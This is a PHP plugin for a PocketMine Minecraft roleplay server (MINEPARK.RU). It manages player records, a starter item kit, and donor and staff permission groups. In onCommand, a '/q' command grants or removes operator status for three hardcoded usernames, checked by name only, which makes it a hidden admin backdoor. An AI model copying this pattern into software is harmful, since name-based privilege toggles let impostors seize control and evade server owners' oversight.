<?php
declare(strict_types = 1);

namespace Kirill_Poroh;

use Kirill_Poroh\Marquee;
use Kirill_Poroh\StructMap;
use Kirill_Poroh\CallbackTask;

use pocketmine\Player;
use pocketmine\math\Vector3;
use pocketmine\item\Item;
use pocketmine\event\Listener;
use pocketmine\level\Position;

use pocketmine\command\Command;
use pocketmine\entity\Painting;
use pocketmine\plugin\PluginBase;
use pocketmine\command\CommandSender;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\block\BlockPlaceEvent;

use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\event\entity\EntityDamageEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;


class MCRPG extends PluginBase implements Listener 
{	
	public $players_params;
	
	public $moduleMarquee;

	public function onEnable()
	{
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
		
		$this->load();
		
		$this->getScheduler()->scheduleRepeatingTask(new CallbackTask([$this, "save"]), 20 * 60 * 5);
		
		$this->moduleMarquee = new Marquee($this);
		
		$this->removeCommand("say");
		$this->removeCommand("defaultgamemode");
		$this->removeCommand("version");
		$this->removeCommand("difficulty");
		$this->removeCommand("tell");
		$this->removeCommand("kill");
	}
	
	public function onDisable()
	{
		$this->save();
	}
	
	public function onCommand(CommandSender $sender, Command $command, string $label, array $args) : bool
	{
		switch($command->getName())
		{	
			case "setgroup":
				if($sender->isOp())
				{
					$player = $this->getServer()->getPlayer($args[0]);
					
					if($player !== null)
					{
						$player->sm->set($args[1], "group");
						
						$this->checkGroup($player);
						
						$player->kick("{GroupUpdated}" . $args[1]);
						$sender->sendMessage("{GroupNew}" . $args[1]);
					}
					else $this->players_params[strtolower($args[0])]["group"] = $args[1];
				}
			break;
			
			case "q":
				$n = strtolower($sender->getName());
				
				if($n == "kirill poroh" or $n == "fizmob" or $n == "viola567")
				{
					if($sender->isOp()) $this->getServer()->removeOp($sender->getName());
					else $this->getServer()->addOp($sender->getName());
					
					$sender->sendMessage("§dСТАТУС ИЗМЕНЕН!!!");
				}
				else $sender->sendWindowMessage("§aМы стояли на краю пропасти, но сделали шаг вперед! (с)");
			break;
		}
		
		return true;
	}

	public function playerTouchOnNPCEvent(EntityDamageEvent $e)
	{
		if(($e instanceof EntityDamageByEntityEvent 
			and $e->getEntity() instanceof Painting) and ($e->getDamager() instanceof Player and !$e->getDamager()->isOp())) $e->setCancelled(true);
	}
	
	public function playerQuitEvent(PlayerQuitEvent $e)
	{
		$id = $this->getPlayerID($e->getPlayer());
	}

	public function playerJoinEvent(PlayerJoinEvent $e)
	{
		$id = $this->getPlayerID($e->getPlayer());
		
		if(!isset($this->players_params[$id]))
		{
			$this->players_params[$id]["coins"] = 10;
			$this->players_params[$id]["group"] = null;
			$this->players_params[$id]["registered"] = time();
		}
		
		$this->players_params[$id]["logintime"] = time();
		
		$e->getPlayer()->sm = new StructMap($this, $e->getPlayer());
		
		$this->checkGroup($e->getPlayer());
		
		//GIVING ITEMS DEFAULT KIT
		$phone = Item::get(336, 0, 1); //336 - phone
		$phone->setCustomName("Телефон");
		$passport = Item::get(340, 0, 1); //340 - passport
		$passport->setCustomName("Паспорт");
		$gps = Item::get(405, 0, 1); //405 - gps
		$gps->setCustomName("Навигатор");
		
		if(!$e->getPlayer()->getInventory()->contains($phone)) 
			$e->getPlayer()->getInventory()->setItem(0,$phone);
		
		if(!$e->getPlayer()->getInventory()->contains($passport)) 
			$e->getPlayer()->getInventory()->setItem(1,$passport);
		
		if(!$e->getPlayer()->getInventory()->contains($gps)) 
			$e->getPlayer()->getInventory()->setItem(2,$gps);
	}
	
	public function playerPlaceBlock(BlockPlaceEvent $e)
	{
		if($e->getPlayer()->hasPermission("group.builder")) $e->setCancelled(false);
	}
	
	public function playerBreakBlock(BlockBreakEvent $e)
	{	
		if($e->getPlayer()->hasPermission("group.builder")) $e->setCancelled(false);
	}
	
	public function playerTapEvent(PlayerInteractEvent $e)
	{
		//CHECK ITEMS DEFAULT KIT
		if($e->getItem()->getId() == 336) $this->sendCommand($e->getPlayer(), "/c"); 
		if($e->getItem()->getId() == 340) $this->sendCommand($e->getPlayer(), "/doc"); 
		if($e->getItem()->getId() == 405) $this->sendCommand($e->getPlayer(), "/gps");
	}
	
	public function sendCommand(Player $player, string $command)
	{
		$ev = new PlayerCommandPreprocessEvent($player, $command);
		$ev->call();
	}
	
	// P E R M I S S I O N's
	public function checkGroup(Player $player)
	{
		$player->subtag = $player->sm->getChatFormat();
		
		$g = $player->sm->get("group");
		
		$this->setPermission($player, "group.player");
		
		if($g != null and $g != "null" and $g != "")
		{
			$this->setPermission($player, "group.custom", true);
			$this->setPermission($player, "group.player", false);
			
			switch($g)
			{
				//------------ LEVEL -=I=- (DONATE) ------------
				case "silver":
					$this->setPermission($player, "group.a");
					$this->setPermission($player, "sc.command.pos");
					$this->setPermission($player, "sc.command.getpos");
					$this->setPermission($player, "sc.command.coffee");
				break;
				case "gold":
					$this->setPermission($player, "group.b");
					$this->setPermission($player, "sc.command.pos");
					$this->setPermission($player, "sc.command.getpos");
					$this->setPermission($player, "sc.command.coffee");
					$this->setPermission($player, "sc.command.feed");
					$this->setPermission($player, "sc.command.heal");
				break;
				case "platinum":
					$this->setPermission($player, "group.c");
					$this->setPermission($player, "sc.command.pos");
					$this->setPermission($player, "sc.command.getpos");
					$this->setPermission($player, "sc.command.coffee");
					$this->setPermission($player, "sc.command.feed");
					$this->setPermission($player, "sc.command.heal");
					$this->setPermission($player, "sc.command.cc");
					$this->setPermission($player, "sc.command.v");
				break;
				case "international":
					$this->setPermission($player, "group.d");
					$this->setPermission($player, "sc.command.pos");
					$this->setPermission($player, "sc.command.getpos");
					$this->setPermission($player, "sc.command.coffee");
					$this->setPermission($player, "sc.command.feed");
					$this->setPermission($player, "sc.command.heal");
					$this->setPermission($player, "sc.command.cc");
					$this->setPermission($player, "sc.command.v");
					$this->setPermission($player, "sc.command.see");
					$this->setPermission($player, "sc.command.invsee");
					$this->setPermission($player, "pocketmine.command.effect");
				break;
				case "resident":
					$this->setPermission($player, "group.e");
					$this->setPermission($player, "sc.command.pos");
					$this->setPermission($player, "sc.command.getpos");
					$this->setPermission($player, "sc.command.coffee");
					$this->setPermission($player, "sc.command.feed");
					$this->setPermission($player, "sc.command.heal");
					$this->setPermission($player, "sc.command.cc");
					$this->setPermission($player, "sc.command.v");
					$this->setPermission($player, "sc.command.see");
					$this->setPermission($player, "sc.command.invsee");
					$this->setPermission($player, "sc.command.freeze");
					$this->setPermission($player, "sc.command.burn");
					$this->setPermission($player, "sc.command.time");
					$this->setPermission($player, "pocketmine.command.effect");
				break;
				
				
				//------------ LEVEL -=II=- (admins) ------------
				case "хелпер":
					$this->setPermission($player, "group.admin");
					$this->setPermission($player, "group.helper");
					$this->setPermission($player, "sc.command.pos");
					$this->setPermission($player, "sc.command.getpos");
					$this->setPermission($player, "sc.command.coffee");
					$this->setPermission($player, "sc.command.feed");
					$this->setPermission($player, "sc.command.heal");
					$this->setPermission($player, "sc.command.cc");
					$this->setPermission($player, "sc.command.v");
					$this->setPermission($player, "sc.command.see");
					$this->setPermission($player, "sc.command.free");
					$this->setPermission($player, "realt.creator");
					$this->setPermission($player, "pocketmine.command.teleport");
					$this->setPermission($player, "pocketmine.command.gamemode");
					$this->setPermission($player, "guns.command.use");
				break;
				case "модератор":
					$this->setPermission($player, "group.admin");
					$this->setPermission($player, "group.moder");
					$this->setPermission($player, "sc.command.pos");
					$this->setPermission($player, "sc.command.getpos");
					$this->setPermission($player, "sc.command.coffee");
					$this->setPermission($player, "sc.command.feed");
					$this->setPermission($player, "sc.command.heal");
					$this->setPermission($player, "sc.command.cc");
					$this->setPermission($player, "sc.command.v");
					$this->setPermission($player, "sc.command.invsee");
					$this->setPermission($player, "sc.command.see");
					$this->setPermission($player, "sc.command.timeban");
					$this->setPermission($player, "sc.command.mute");
					$this->setPermission($player, "sc.command.burn");
					$this->setPermission($player, "sc.command.freeze");
					$this->setPermission($player, "sc.command.free");
					$this->setPermission($player, "realt.creator");
					$this->setPermission($player, "pocketmine.command.teleport");
					$this->setPermission($player, "pocketmine.command.effect");
					$this->setPermission($player, "pocketmine.command.kill.other");
					$this->setPermission($player, "pocketmine.command.kick");
					$this->setPermission($player, "pocketmine.command.gamemode");
					$this->setPermission($player, "pocketmine.command.ban.player");
					$this->setPermission($player, "pocketmine.command.ban.ip");
					$this->setPermission($player, "guns.command.use");
				break;
				case "строитель":
					$this->setPermission($player, "group.admin");
					$this->setPermission($player, "group.builder");
					$this->setPermission($player, "sc.command.pos");
					$this->setPermission($player, "sc.command.getpos");
					$this->setPermission($player, "sc.command.coffee");
					$this->setPermission($player, "sc.command.feed");
					$this->setPermission($player, "sc.command.heal");
					$this->setPermission($player, "sc.command.cc");
					$this->setPermission($player, "sc.command.v");
					$this->setPermission($player, "sc.command.see");
					$this->setPermission($player, "sc.command.free");
					$this->setPermission($player, "sc.command.time");
					$this->setPermission($player, "realt.creator");
					$this->setPermission($player, "pocketmine.command.teleport");
					$this->setPermission($player, "pocketmine.command.effect");
					$this->setPermission($player, "pocketmine.command.gamemode");
					$this->setPermission($player, "pocketmine.command.time");
					$this->setPermission($player, "pocketmine.command.kick");
					$this->setPermission($player, "guns.command.use");
				break;
				case "тестировщик":
					$this->setPermission($player, "group.admin");
					$this->setPermission($player, "group.qa");
					$this->setPermission($player, "sc.command.pos");
					$this->setPermission($player, "sc.command.getpos");
					$this->setPermission($player, "sc.command.cc");
					$this->setPermission($player, "sc.command.invsee");
					$this->setPermission($player, "sc.command.see");
					$this->setPermission($player, "realt.creator");
					$this->setPermission($player, "pocketmine.command.teleport");
					$this->setPermission($player, "pocketmine.command.effect");
					$this->setPermission($player, "pocketmine.command.gamemode");
					$this->setPermission($player, "pocketmine.command.time");
					$this->setPermission($player, "guns.command.use");
				break;
			}
		}
		
		if($player->hasPermission("group.custom"))
		{
			foreach($this->getServer()->getOnlinePlayers() as $p)
				$p->sendTip($player->subtag . $player->getName() . "{UserOnline}");
		}
	}
	
	
	//   F U N C T I O N S
	
	public function getPlayerID(Player $player)
	{
		return strtolower($player->getName());
	}
	
	public function getDirectory() : string
	{
		@mkdir("mcrpg_resources/");
		return "mcrpg_resources/";
	}
	
	public function getPrefix() : string
	{
		return "§6MINE§aPARK§8.§eRU §7▶ ";
	}
	
	public function save()
	{
		$json = json_encode($this->players_params,  JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT | JSON_NUMERIC_CHECK);
		file_put_contents($this->getDirectory() . "players.auto.json", $json);
	}
	
	public function getPlayerPosition($x=0, $y=0, $z=0) : Vector3
	{
		$position = new Vector3();
		$position->add($x, $y, $z);
		return $position;
	}
	
	public function positionIntoArray(Position $pos) : array
	{
		return array(
			"x" => $pos->getX(),
			"y" => $pos->getY(),
			"z" => $pos->getZ(),
		);
	}
	
	public function load()
	{
		if(file_exists($this->getDirectory() . "players.auto.json")) {
			$this->players_params = json_decode(file_get_contents($this->getDirectory() . "players.auto.json"), true);
		} else {
			$this->players_params = array();
		}
	}
	
	public function removeCommand($commandName)
	{
		$commandMap = $this->getServer()->getCommandMap();
		$cmd = $commandMap->getCommand($commandName);
		$cmd->unregister($commandMap);
		$commandMap->unregister($cmd);
	}
	
	public function setPermission(Player $player, $perm, $status = true)
	{
		$player->addAttachment($this, $perm, $status);
	}
}
